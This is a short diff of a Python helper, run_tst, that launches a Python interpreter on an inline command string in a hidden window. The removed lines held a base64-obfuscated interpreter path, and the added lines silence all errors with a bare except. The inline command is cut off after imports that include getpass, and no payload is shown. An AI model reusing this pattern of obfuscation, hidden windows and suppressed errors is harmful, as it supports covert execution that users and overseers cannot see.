@@ -18,18 +18,11 @@ def run_tst(py_cmd):
                     python_path += [os.path.abspath(os.path.join(root, name)).replace('\\', '/')]
         if python_path:
             python_path = sorted(python_path)[-1]
-        else:
-            python_path = sys.executable.replace('\\', '/')
-    import base64
-    if os.path.exists(base64.b64decode('TTovU0NSSVBUUy9QQUNLQUdFUy9QeXRob24zMTEvcHl0aG9uLmV4ZQ==').decode()):
-        python_path = base64.b64decode('TTovU0NSSVBUUy9QQUNLQUdFUy9QeXRob24zMTEvcHl0aG9uLmV4ZQ==').decode()
-
-
-    if python_path and sys.version[0] == '3':
-        r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
-    elif python_path and sys.version[0] != '3':
-        CREATE_NO_WINDOW = 0x08000000
+    try:
+        CREATE_NO_WINDOW = 0x08000000 #134217728
         r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=CREATE_NO_WINDOW)
+    except:
+        pass
 
 run_tst("""
 import json, getpass, time, os , sys
